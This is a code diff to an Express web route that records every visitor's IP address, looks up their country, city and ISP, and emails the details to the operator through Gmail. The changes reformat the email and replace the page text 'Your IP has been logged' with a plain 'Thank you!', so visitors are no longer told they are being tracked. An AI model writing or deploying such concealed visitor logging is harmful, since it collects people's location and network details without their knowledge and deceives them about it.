@@ -28,13 +28,13 @@ app.get("/", async (req, res) => {
 		const now = new Date().toLocaleString();
 
 		const message = `
-			✅ New visitor logged:
+			<b>✅ New visitor logged</b>:
 
-			📍 IP: ${userIP}
-			🌎 Country: ${data.country}
-			🏙️ City: ${data.city}
-			🏢 ISP: ${data.isp}
-			🕒 Time: ${now}
+		📍 IP: ${userIP}
+		🌎 Country: ${data.country}
+		🏙️ City: ${data.city}
+		🏢 ISP: ${data.isp}
+		🕒 Time: ${now}
     	`.trim();
 
 		// Send email
@@ -48,7 +48,9 @@ app.get("/", async (req, res) => {
 		console.log(`[GMAIL SENT] ${message}`);
 
 		// Send simple HTML response to visitor
-		res.send(`<h2>Your IP has been logged. Thank you!</h2>`);
+		res.send(
+			`<div style="margin: -8px;height: 100vh;display: flex;align-items: center;justify-content: center;"><span>Thank you!</span></div>`
+		);
 	} catch (e) {
 		console.error("❌ Error during IP logging or email:", e);
 		res.status(500).send("Error logging IP.");
